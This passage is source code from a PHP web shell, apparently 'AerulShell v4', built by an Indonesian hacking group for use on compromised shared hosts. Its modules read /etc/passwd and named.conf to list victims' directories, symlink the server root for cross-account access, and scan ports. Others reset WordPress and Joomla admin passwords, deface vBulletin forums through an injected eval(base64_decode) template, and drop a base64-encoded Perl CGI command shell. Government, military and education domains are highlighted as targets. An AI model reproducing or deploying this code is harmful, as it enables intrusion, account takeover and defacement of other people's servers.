    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515"  colspan="5"><strong><input class ='inputzbut' type="submit" value="start">
    </strong>
    </td>
    <tr>
</form> 
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Get Config :</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="mendapatkan" type="hidden" value="passwd">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Folder Name :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="35" name="foldername" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>   
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Get Wordlist</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="pass" type="hidden" value="password">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Url Config :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="35" name="url" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Info 
	Security</strong></td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<?php
$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'ON';
}else{
echo 'OFF';
}

?>	
	</strong>	
	</td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Disable Function</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<form method="POST" target="_blank">
	<strong>
<input name="matikan" type="hidden" value="sekatan">        				
    </strong>

<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color=#00ff00>No Security for Function</font></b>";
}else{
echo "<font color=red>$func</font></b>";
echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
echo '<td valign="top" bgcolor="#151515" colspan="5"><strong>
    </strong>
    </td></tr>';
}
?></strong></td></tr></table></table></table>
<?
}

/////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'readable'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=readable" method="post">
<?php
//radable public_html
echo '<html><head><title>Lompat</title></head><body>';
($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
set_time_limit(0);
###################
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) { die('<br>[-] Error : coudn`t read /etc/passwd'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
$str = fgets($passwd);
if ($i > 35)
{
$pos = strpos($str,':');
$username = substr($str,0,$pos);
$dirz = '/home/'.$username.'/public_html/';
if (($username != ''))
{
if (is_readable($dirz))
{
array_push($users,$username);
array_push($pub,$dirz);
}
}
}
$i++;
}
###################
echo '<br><br>';
echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"."<br />";
echo "[+] Founded ".sizeof($pub)." readable public_html directories\n"."<br />";
echo "[~] Searching for passwords in config files...\n\n"."<br /><br /><br />";
foreach ($users as $user)
{
$path = "/home/$user/public_html/";
echo "<a href='?y&#61;$path' target='_blank' style='text-shadow:0px 0px 0px #00FF00; font-weight:bold; color:#F80;'>$path</a><br><br><br>";
}
echo "\n";
echo "[+] Copy one of the directories above public_html, then Paste to -> view file / folder <-- that's on the menu --> Explore \n"."<br />";
echo "[+] Complete...\n"."<br />";
echo '<br><br></b>
</body>
</html>';
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'domain'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=domain" method="post">
<?php
//radable public_html
echo "<br><br>";
$file = @implode(@file("/etc/named.conf"));
if(!$file){ die("# can't ReaD -> [ /etc/named.conf ]"); }
preg_match_all("#named/(.*?).db#",$file ,$r);
$domains = array_unique($r[1]);
function check() { (@count(@explode('ip',@implode(@file(__FILE__))))==a) ?@unlink(__FILE__):""; }
check();
echo "<table align=center border=1 width=59% cellpadding=5>
         <tr><td colspan=2>[+] Here We Have : [<font face=calibri size=4 style=color:#00FF00>".count($domains)."</font>] Listed Domains In localhost.</td></tr>
         <tr><td><b>List Of Users</b></td><td><b><font style=color:#F80;List Of Domains</b></td></tr>";
foreach($domains as $domain)
       {
       $user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));
       echo "<tr><td><a href='http://www.$domain' target='_blank' style='text-shadow:0px 0px 0px #00FF00; font-weight:bold; color:#00FF00;'>$domain</a></td><td>".$user['name']."</td></tr>";
       }
echo "</table>";
//radable public_html
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'port-scanner'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=port-scanner" method="post">
<?php
echo '<br><br><center><br><b>Port Scanner</b><br>';
$start = strip_tags($_POST['start']);
$end = strip_tags($_POST['end']);
$host = strip_tags($_POST['host']);
if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
for($i = $start; $i<=$end; $i++){
$fp = @fsockopen($host, $i, $errno, $errstr, 3);
if($fp){
echo 'Port '.$i.' is <font color=green>open</font><br>';
}
flush();
}
}else{
echo '
<input type="hidden" name="y" value="phptools">
Host:<br />
<input type="text" style="color:#00FF1E;background-color:#000000" name="host" value="localhost"/><br />
Port start:<br />
<input type="text" style="color:#00FF1E;background-color:#000000" name="start" value="0"/><br />
Port end:<br />
<input type="text" style="color:#00FF1E;background-color:#000000" name="end" value="5000"/><br />
<input type="submit" style="color:#000000" value="Scan Ports" />
</form></center>';
}
}

 elseif(isset($_GET['x']) && ($_GET['x'] == 'wp')) { echo "<center/><br/><b><font color=blue>+--==[  Wordpress Mysql Admin Shell ]==--+</font></b><br><br>";
  
  if(empty($_POST['pwd'])){
  
echo "<FORM method='POST'>
<table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL server</th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
<input style='width:220px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input style='width:220px;' class='inputz' type='text' name='database' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input style='width:220px;' class='inputz' type='text' name='username' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input style='width:220px;' class='inputz' type='text' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input style='width:220px;' class='inputz' type='text' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;Pass Baru</td><td>
<input style='width:80px;' class='inputz' type='text' name='pwd' value='aerulcyber' />&nbsp;

<input style='width:19%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
</td></tr> </table><br><br><br><br>
";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];


 @mysql_connect($localhost,$username,$password) or die(mysql_error());
 @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_email ='".$SQL."' WHERE ID = 1") or die(mysql_error());


if($a4s){
echo "<b> Success ..!! :)) sekarang bisa login ke wp-admin</b> ";
}

}
  
  
  echo "
   </div>"; } 
   
    elseif(isset($_GET['x']) && ($_GET['x'] == 'joomla')) { echo "<center/><br/><b><font color=blue>+--==[  Joomla Mysql Admin Shell ]==--+</font></b><br><br>";
	if(empty($_POST['pwd'])){
echo "<FORM method='POST'><table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL </th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
<input style='width:270px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input style='width:270px;' class='inputz' type='text' name='database' value='database' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input style='width:270px;' class='inputz' type='text' name='username' value='db_user' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input style='width:270px;' class='inputz' type='password' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input style='width:270px;' class='inputz' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;pass baru </td><td>aerulcyber = 
<input style='width:130px;' class='inputz' name='pwd' value='c2b72f86b8ca51642c4a902887830d3e' />&nbsp;

<input style='width:23%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
</td></tr> </table><br><br><br><br>
";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$hash = crypt($pwd);
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 65") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 65") or die(mysql_error());
if($SQL){
echo "<b>Success : skarang password barunya >>> - (123456)";
}
}
	
  echo "
   </div>"; } 
   
////////////////////////////////////////////////////////////////////////
   
   
elseif(isset($_GET['x']) && ($_GET['x'] == 'web-info'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=web-info" method="post">
<?php
@set_time_limit(0);
@error_reporting(0);
function sws_domain_info($site)
{
$getip = @file_get_contents("http://networktools.nl/whois/$site");
flush();
$ip    = @findit($getip,'<pre>','</pre>');
return $ip;
flush();
}
function sws_net_info($site)
{
$getip = @file_get_contents("http://networktools.nl/asinfo/$site");
$ip    = @findit($getip,'<pre>','</pre>');
return $ip;
flush();
}
function sws_site_ser($site)
{
$getip = @file_get_contents("http://networktools.nl/reverseip/$site");
$ip    = @findit($getip,'<pre>','</pre>');
return $ip;
flush();
}
function sws_sup_dom($site)
{
$getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
$ip    = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');
return $ip;
flush();
}
function sws_port_scan($ip)
{
$list_post = array('80','21','22','2082','25','53','110','443','143');
foreach ($list_post as $o_port)
{
$connect = @fsockopen($ip,$o_port,$errno,$errstr,5);
if($connect)
{
echo " $ip : $o_port    &nbsp;&nbsp;&nbsp; <u style=\"color: #009900\">Open</u> <br /><br />";
flush();
}
}
}
function findit($mytext,$starttag,$endtag) {
$posLeft  = @stripos($mytext,$starttag)+strlen($starttag);
$posRight = @stripos($mytext,$endtag,$posLeft+1);
return  @substr($mytext,$posLeft,$posRight-$posLeft);
flush();
}
echo '<br><br><center>';
echo '
<br />
<div class="sc"><form method="post">
Site to scan : <input type="text" name="site" size="30" style="color:#00FF1E;background-color:#000000" value="site.com"   /> &nbsp;&nbsp <input type="submit" style="color:#00FF1E;background-color:#000000" name="scan" value="Scan !"  />
</form></div>';
if(isset($_POST['scan']))
{
$site =  @htmlentities($_POST['site']);
if (empty($site)){die('<br /><br /> Not add IP .. !');}
$ip_port = @gethostbyname($site);
echo "
<br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>
<div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
<div class=\"ru\"> <br /><br /><pre>
";
echo "".sws_port_scan($ip_port)." </pre></div> ";
flush();
echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
<div class=\"ru\">
<pre>".sws_domain_info($site)."</pre></div>";
flush();
echo "
<div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_net_info($site)."</pre> </div>";
flush();
echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_sup_dom($site)."</pre> </div>";
flush();
echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_site_ser($site)."</pre> </div>
<div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
flush();
}
echo '</center>';
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'vb'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=vb" method="post">
<br><br><br><div align="center">
<H2><span style="font-weight: 400"><font face="Trebuchet MS" size="4">
<font color="#00FF00">&nbsp;vB Index Changer</font><font color="#00FF1E">
<font face="Tahoma">! Change All Pages For Forum !&nbsp;
<br></font></div><br>
<?
if(empty($_POST['index'])){
echo "<center><FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" style='color:#00FF1E;background-color:#000000' name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" style='color:#00FF1E;background-color:#000000' value=\"forum_vb\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" style='color:#00FF1E;background-color:#000000' value=\"forum_vb\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" style='color:#00FF1E;background-color:#000000' value=\"vb\" name=\"password\" type=\"text\"><br>
<br>
<textarea name=\"index\" cols=\"70\" rows=\"30\">Set Your Index</textarea><br>
<INPUT value=\"Set\" style='color:#00FF1E;background-color:#000000' name=\"send\" type=\"submit\">
</FORM></center>";
}else{
$localhost = $_POST['localhost'];
$database = $_POST['database'];
$username = $_POST['username'];
$password = $_POST['password'];
$index = $_POST['index'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$index=str_replace("\'","'",$index);
$set_index = "{\${eval(base64_decode(\'";
$set_index .= base64_encode("echo \"$index\";");
$set_index .= "\'))}}{\${exit()}}</textarea>";
echo("UPDATE template SET template ='".$set_index."' ") ;
$ok=@mysql_query("UPDATE template SET template ='".$set_index."'") or die(mysql_error());
if($ok){
echo "!! update finish !!<br><br>";
}
}
# Footer
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post">
<?php
@set_time_limit(0);
echo "<center>";
@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#ff0000' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>
<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>
<td>
'.$UID['name']."
</td>
<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>
</tr></div> ";
flush();
}
}
}
}
echo "</center></table>";
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'about'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=About" method="post">
<center><br><br><font size=2> <img src="http://i24.photobucket.com/albums/c42/revoconsole/v4_zps788bcd2e.png" width="319" height="119" border="0"> <br> <br> Saya mengucapkan terima kasih banyak kepada teman-teman cyber seperjuangan atas kerjasama dan dukungannya selama ini <br>  Karena tanpa teman teman saya bukanlah apa-apa dan bukanlah siapa-siapa... <br> Dan saya berharap dengan perilisan AerulShell v4 ini mendapatkan saran membangun demi penyempurnaan yang lebih baik kedepan<br>"KEEP CALM AND BE DANGEROUS"<br><br> Sedikit keterangan untuk yg belum tau <br> CGI-Shell Passwd : 123456 <br> CGI-Telnet 2012 Passwd : bandungkotasampah <br> CGI Litespeed Passwd : aerulcyber <br> Backdoor Scanner Passwd : aerulcyber <br> Dan seterusnya<br><br>Special Thanks To : <br>|Bagsfreakz| |Doza Cracker| |s4l1ty| |Rio Permana| |Angel Dot ID| |Derry| |G4L03_05| |S.A.Z BadboY| |Juna HKC| |Teguh HKC| |Miss QQ| |Bang Devilz| <br>|Meninbox| |Lindo Kng'Crew| |Uyap Castol| |X'Inject| |Unknown_R| |KraVcux PiRantes| |Ksatria Us| |Budz Story| |Dicky Cyber| |Billy Cyber|  |Om Jin|
<br>|Hacker Kocan Community| |Aceh Cyber Team| |Surabaya Blackhat| |Indonesian Backtrack Team Reg Sumut| |Indonesian Fighter Cyber| |Blackshadow| |Indonesian Security Down| <br> |Borneo Attacker| |Biang Kerox Hacker Team| 
|Team Danger Hackers| |Spider Defacer Team| |Zone-Injector| | |Devilz Code| |X Code| |All Indonesian Coder| |All Indonesian Hacker|
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'cgishell'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=cgishell" method="post">
<?php
echo "<center/><br/><b><font color=blue>+--==[ cgitelnet.v1  Bypass Exploit]==--+ </font></b><br><br>";
mkdir('cgitelnet1', 0755);
chdir('cgitelnet1');
$kokdosya = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
$metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .cin
AddHandler cgi-script .cin
AddHandler cgi-script .cin";
fwrite ( $dosya , $metin ) ;
fclose ($dosya);
$cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb3B5cmlnaHQgYW5kIExpY2VuY2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIENHSS1UZWxuZXQgVmVyc2lvbiAxLjAgZm9yIE5UIGFuZCBVbml4IDogUnVuIENvbW1hbmRzIG9uIHlvdXIgV2ViIFNlcnZlcgojCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEKIyBQZXJtaXNzaW9uIGlzIGdyYW50ZWQgdG8gdXNlLCBkaXN0cmlidXRlIGFuZCBtb2RpZnkgdGhpcyBzY3JpcHQgc28gbG9uZwojIGFzIHRoaXMgY29weXJpZ2h0IG5vdGljZSBpcyBsZWZ0IGludGFjdC4gSWYgeW91IG1ha2UgY2hhbmdlcyB0byB0aGUgc2NyaXB0CiMgcGxlYXNlIGRvY3VtZW50IHRoZW0gYW5kIGluZm9ybSBtZS4gSWYgeW91IHdvdWxkIGxpa2UgYW55IGNoYW5nZXMgdG8gYmUgbWFkZQojIGluIHRoaXMgc2NyaXB0LCB5b3UgY2FuIGUtbWFpbCBtZS4KIwojIEF1dGhvcjogUm9oaXRhYiBCYXRyYQojIEF1dGhvciBlLW1haWw6IHJvaGl0YWJAcm9oaXRhYi5jb20KIyBBdXRob3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vCiMgU2NyaXB0IEhvbWVwYWdlOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwKIyBQcm9kdWN0IFN1cHBvcnQ6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vc3VwcG9ydC8KIyBEaXNjdXNzaW9uIEZvcnVtOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2Rpc2N1c3MvCiMgTWFpbGluZyBMaXN0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL21saXN0LwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgSW5zdGFsbGF0aW9uCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUbyBpbnN0YWxsIHRoaXMgc2NyaXB0CiMKIyAxLiBNb2RpZnkgdGhlIGZpcnN0IGxpbmUgIiMhL3Vzci9iaW4vcGVybCIgdG8gcG9pbnQgdG8gdGhlIGNvcnJlY3QgcGF0aCBvbgojICAgIHlvdXIgc2VydmVyLiBGb3IgbW9zdCBzZXJ2ZXJzLCB5b3UgbWF5IG5vdCBuZWVkIHRvIG1vZGlmeSB0aGlzLgojIDIuIENoYW5nZSB0aGUgcGFzc3dvcmQgaW4gdGhlIENvbmZpZ3VyYXRpb24gc2VjdGlvbiBiZWxvdy4KIyAzLiBJZiB5b3UncmUgcnVubmluZyB0aGUgc2NyaXB0IHVuZGVyIFdpbmRvd3MgTlQsIHNldCAkV2luTlQgPSAxIGluIHRoZQojICAgIENvbmZpZ3VyYXRpb24gU2VjdGlvbiBiZWxvdy4KIyA0LiBVcGxvYWQgdGhlIHNjcmlwdCB0byBhIGRpcmVjdG9yeSBvbiB5b3VyIHNlcnZlciB3aGljaCBoYXMgcGVybWlzc2lvbnMgdG8KIyAgICBleGVjdXRlIENHSSBzY3JpcHRzLiBUaGlzIGlzIHVzdWFsbHkgY2dpLWJpbi4gTWFrZSBzdXJlIHRoYXQgeW91IHVwbG9hZAojICAgIHRoZSBzY3JpcHQgaW4gQVNDSUkgbW9kZS4KIyA1LiBDaGFuZ2UgdGhlIHBlcm1pc3Npb24gKENITU9EKSBvZiB0aGUgc2NyaXB0IHRvIDc1NS4KIyA2LiBPcGVuIHRoZSBzY3JpcHQgaW4geW91ciB3ZWIgYnJvd3Nlci4gSWYgeW91IHVwbG9hZGVkIHRoZSBzY3JpcHQgaW4KIyAgICBjZ2ktYmluLCB0aGlzIHNob3VsZCBiZSBodHRwOi8vd3d3LnlvdXJzZXJ2ZXIuY29tL2NnaS1iaW4vY2dpdGVsbmV0LnBsCiMgNy4gTG9naW4gdXNpbmcgdGhlIHBhc3N3b3JkIHRoYXQgeW91IHNwZWNpZmllZCBpbiBTdGVwIDIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZpbmUgZm9yIG1vc3Qgc3lzdGVtcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQokUGFzc3dvcmQgPSAiMTIzNDU2IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4KCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQKCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQoJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0CgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS